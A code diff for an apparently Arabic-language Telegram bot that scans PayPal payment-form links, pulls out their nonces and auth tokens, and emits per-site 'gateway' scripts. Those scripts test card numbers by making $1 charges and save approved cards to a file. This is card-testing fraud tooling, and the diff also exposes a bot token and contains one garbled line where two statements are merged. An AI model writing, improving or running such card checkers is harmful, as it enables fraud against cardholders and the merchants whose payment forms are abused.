@@ -1,16 +1,18 @@
 import telebot
 import time
 import threading
+import gc
+import queue
 from telebot import types
 import requests, random, json, string, re, base64
-from telebot.types import LabeledPrice
 from datetime import datetime, timedelta
 import os
 import html
 from user_agent import generate_user_agent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import psutil
+import signal
 
 # === بيانات البوت ===
 token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
@@ -28,6 +30,19 @@ if not os.path.exists('blockusers.txt'):
         f.write('')
 
 processing_status = {}
+
+# === فحص الذاكرة ===
+def check_memory():
+    """فحص الذاكرة المتاحة"""
+    memory = psutil.virtual_memory()
+    return memory.available / (1024 * 1024)  # بالميجابايت
+
+def cleanup_memory():
+    """تنظيف الذاكرة"""
+    gc.collect()
+    if check_memory() < 100:  # أقل من 100MB
+        print(f"⚠️ Low memory: {check_memory():.2f}MB available")
+        gc.collect()
 
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -711,8 +726,7 @@ if __name__ == '__main__':
                         ar = input('Enter Card ( n | mm | yy | cvc ): ')
                         rr = PayPal()
                         itt = rr.Key()
-                        pali = rr.Krs
-                        resulti = pali(ar)
+                        pali = rr.Krs                        resulti = pali(ar)
                         if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                             with open('Approved Card.txt', "a") as f:
                                 f.write(ar +f': {{resulti}} > {{Getat}}')
@@ -895,66 +909,158 @@ def process_bulk_file(message):
             except:
                 return None
         
-        # استخدام ThreadPoolExecutor للسرعة
+        # استخدام queue بدل ThreadPoolExecutor للتحكم في الذاكرة
+        q = queue.Queue()
         live_data = []
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            futures = []
-            for i, link in enumerate(links, 1):
-                future = executor.submit(check_link, link, i)
-                futures.append((future, i, link))
-            
-            for future, i, link in futures:
+        results_lock = threading.Lock()
+        
+        for link in links:
+            q.put(link)
+        
+        def worker():
+            while not q.empty():
                 try:
-                    result = future.result(timeout=15)
+                    link = q.get(timeout=1)
+                    result = check_link(link, 0)
+                    
+                    with results_lock:
+                        with processing_status[user_id]['lock']:
+                            processing_status[user_id]['processed'] += 1
+                            if result:
+                                processing_status[user_id]['live'] += 1
+                                live_data.append(result)
+                            else:
+                                processing_status[user_id]['dead'] += 1
+                            
+                            # تحديث التقدم كل 10 روابط
+                            processed = processing_status[user_id]['processed']
+                            if processed % 10 == 0 or processed == total:
+                                update_progress(chat_id, status_msg.message_id, user_id)
+                    
+                    q.task_done()
+                    # تأخير بسيط لتخفيف الضغط
+                    time.sleep(0.1)
+                except queue.Empty:
+                    break
+                except Exception:
                     with processing_status[user_id]['lock']:
                         processing_status[user_id]['processed'] += 1
-                        if result:
-                            processing_status[user_id]['live'] += 1
-                            live_data.append(result)
-                        else:
-                            processing_status[user_id]['dead'] += 1
-                        
-                        # تحديث التقدم
-                        processed = processing_status[user_id]['processed']
-                        live = processing_status[user_id]['live']
-                        dead = processing_status[user_id]['dead']
-                        progress = int((processed / total) * 100)
-                        
-                        if processed % 5 == 0 or processed == total:
-                            bar_length = 20
-                            filled = int((progress / 100) * bar_length)
-                            bar = '█' * filled + '░' * (bar_length - filled)
-                            
-                            text = f"""📊 <b>جاري فحص الروابط...</b>
+                        processing_status[user_id]['dead'] += 1
+                    q.task_done()
+        
+        def update_progress(chat_id, msg_id, user_id):
+            with processing_status[user_id]['lock']:
+                processed = processing_status[user_id]['processed']
+                live = processing_status[user_id]['live']
+                dead = processing_status[user_id]['dead']
+                total_links = processing_status[user_id]['total']
+            
+            progress = int((processed / total_links) * 100) if total_links > 0 else 0
+            bar_length = 20
+            filled = int((progress / 100) * bar_length)
+            bar = '█' * filled + '░' * (bar_length - filled)
+            
+            text = f"""📊 <b>جاري فحص الروابط...</b>
 ━━━━━━━━━━━━━━━━━━
-📌 إجمالي الروابط: {total}
+📌 إجمالي الروابط: {total_links}
 ✅ شغالة: {live}
 ❌ ميتة: {dead}
 ⏳ التقدم: {progress}% {bar}
 ━━━━━━━━━━━━━━━━━━
-⏱️ تم فحص {processed} من {total}"""
-                            
-                            try:
-                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
-                            except:
-                                pass
-                except:
-                    with processing_status[user_id]['lock']:
-                        processing_status[user_id]['processed'] += 1
-                        processing_status[user_id]['dead'] += 1
+⏱️ تم فحص {processed} من {total_links}"""
+            
+            try:
+                bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML")
+            except:
+                pass
+        
+        # إنشاء 2 workers فقط لتقليل الضغط
+        threads = []
+        for _ in range(2):
+            t = threading.Thread(target=worker)
+            t.daemon = True
+            t.start()
+            threads.append(t)
+        
+        # انتظار الانتهاء
+        for t in threads:
+            t.join()
         
         # النتيجة النهائية
         status = processing_status[user_id]
         
-        # إرسال كل رابط حي كملف Python
+        # إرسال كل رابط حي كملف Python منفصل
         if live_data:
             for idx, data in enumerate(live_data, 1):
-                code = f'''import requests, re, random, time, base64
+                try:
+                    code = generate_gateway_code(data, idx)
+                    file_name = f'gateway_{idx}_{user_id}.py'
+                    with open(file_name, 'w', encoding='utf-8') as f:
+                        f.write(code)
+                    with open(file_name, 'rb') as f:
+                        bot.send_document(
+                            chat_id,
+                            f,
+                            caption=f"""✅ <b>Gateway #{idx}</b>
+━━━━━━━━━━━━━━━━━━━━
+🔗 Link: <code>{data['link']}</code>
+━━━━━━━━━━━━━━━━━━━━
+Dev: @nnunrr""",
+                            parse_mode="HTML"
+                        )
+                    os.remove(file_name)
+                    # تنظيف الذاكرة بعد كل ملف
+                    cleanup_memory()
+                    time.sleep(0.5)  # تأخير بين الملفات
+                except Exception as e:
+                    print(f"Error sending file {idx}: {e}")
+                    continue
+            
+            # النتيجة النهائية
+            final_text = f"""📊 <b>✅ Bulk Extraction Complete!</b>
+━━━━━━━━━━━━━━━━━━━━
+📌 Total Links: {status['total']}
+✅ Live (Extracted): {status['live']}
+❌ Dead (Failed): {status['dead']}
+💯 Success Rate: {int((status['live']/status['total'])*100) if status['total'] > 0 else 0}%
+━━━━━━━━━━━━━━━━━━━━
+Dev: @nnunrr"""
+            try:
+                bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
+            except:
+                bot.send_message(chat_id, final_text, parse_mode="HTML")
+        else:
+            no_live_text = f"""📊 <b>❌ No live links found!</b>
+━━━━━━━━━━━━━━━━━━━━
+📌 Total Links: {status['total']}
+✅ Live: 0
+❌ Dead: {status['dead']}
+━━━━━━━━━━━━━━━━━━━━
+Dev: @nnunrr"""
+            try:
+                bot.edit_message_text(no_live_text, chat_id, status_msg.message_id, parse_mode="HTML")
+            except:
+                bot.send_message(chat_id, no_live_text, parse_mode="HTML")
+        
+        # تنظيف نهائي
+        if user_id in processing_status:
+            del processing_status[user_id]
+        cleanup_memory()
+            
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")
+        cleanup_memory()
+
+def generate_gateway_code(data, idx):
+    """توليد كود gateway لكل رابط حي"""
+    return f'''# PayPal Gateway {idx}
+# Link: {data['link']}
+import requests, re, random, time, base64
 from fake_useragent import UserAgent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 
-class PayPal:
+class PayPal{idx}:
     def __init__(self):
         self.first_name = ["James", "John", "Robert", "Michael", "William"]
         self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
@@ -964,17 +1070,12 @@ class PayPal:
         self.id_form2 = "{data['id_form2']}"
         self.nonec = "{data['nonec']}"
         self.au = "{data['au']}"
-        url = '{data['link']}'
-        parsed = urlparse(url)
-        self.url = parsed.netloc
-        self.inurl = parsed.path
+        self.url = "{data['url']}"
+        self.inurl = "{data['path']}"
         self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
         self.r = requests.Session()
         self.uu = UserAgent()
         self.checked = 0
-
-    def Key(self):
-        return self.au, self.id_form1, self.id_form2, self.nonec
 
     def Charge(self, ccx):
         self.checked += 1
@@ -1049,8 +1150,7 @@ if __name__ == '__main__':
         try:
             while True:
                 ar = input('Enter Card ( n | mm | yy | cvc ): ')
-                rr = PayPal()
-                itt = rr.Key()
+                rr = PayPal{idx}()
                 resulti = rr.Charge(ar)
                 if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                     with open('Approved Card.txt', "a") as f:
@@ -1071,8 +1171,7 @@ if __name__ == '__main__':
             for P in crads:
                 noy += 1
                 try:
-                    rr = PayPal()
-                    itt = rr.Key()
+                    rr = PayPal{idx}()
                     resulti = rr.Charge(P)
                     if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                         live += 1
@@ -1088,50 +1187,6 @@ if __name__ == '__main__':
             print('━' * 30)
             print(f'Total: {{noy}} | Live: {{live}} | Dead: {{dead}}')
             print('━' * 30)'''
-                
-                file_name = f'gateway_{idx}_{user_id}.py'
-                with open(file_name, 'w', encoding='utf-8') as f:
-                    f.write(code)
-                with open(file_name, 'rb') as f:
-                    bot.send_document(
-                        chat_id,
-                        f,
-                        caption=f"""✅ <b>Gateway #{idx}</b>
-━━━━━━━━━━━━━━━━━━━━
-🔗 Link: <code>{data['link']}</code>
-━━━━━━━━━━━━━━━━━━━━
-Dev: @nnunrr""",
-                        parse_mode="HTML"
-                    )
-                os.remove(file_name)
-                time.sleep(0.3)
-            
-            # النتيجة النهائية
-            final_text = f"""📊 <b>✅ Bulk Extraction Complete!</b>
-━━━━━━━━━━━━━━━━━━━━
-📌 Total Links: {status['total']}
-✅ Live (Extracted): {status['live']}
-❌ Dead (Failed): {status['dead']}
-💯 Success Rate: {int((status['live']/status['total'])*100) if status['total'] > 0 else 0}%
-━━━━━━━━━━━━━━━━━━━━
-Dev: @nnunrr"""
-            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
-        else:
-            no_live_text = f"""📊 <b>❌ No live links found!</b>
-━━━━━━━━━━━━━━━━━━━━
-📌 Total Links: {status['total']}
-✅ Live: 0
-❌ Dead: {status['dead']}
-━━━━━━━━━━━━━━━━━━━━
-Dev: @nnunrr"""
-            bot.edit_message_text(no_live_text, chat_id, status_msg.message_id, parse_mode="HTML")
-        
-        # تنظيف
-        if user_id in processing_status:
-            del processing_status[user_id]
-            
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")
 
 # === نظام الحظر ===
 @bot.message_handler(commands=['block2'])
@@ -1168,7 +1223,8 @@ def unblock_user(message):
 print('✅ Bot is running...')
 while True:
     try:
-        bot.infinity_polling(none_stop=True, interval=0)
+        bot.infinity_polling(none_stop=True, interval=0, timeout=20)
     except Exception as e:
         print(f'❌ Error: {e}')
+        cleanup_memory()
         time.sleep(5)
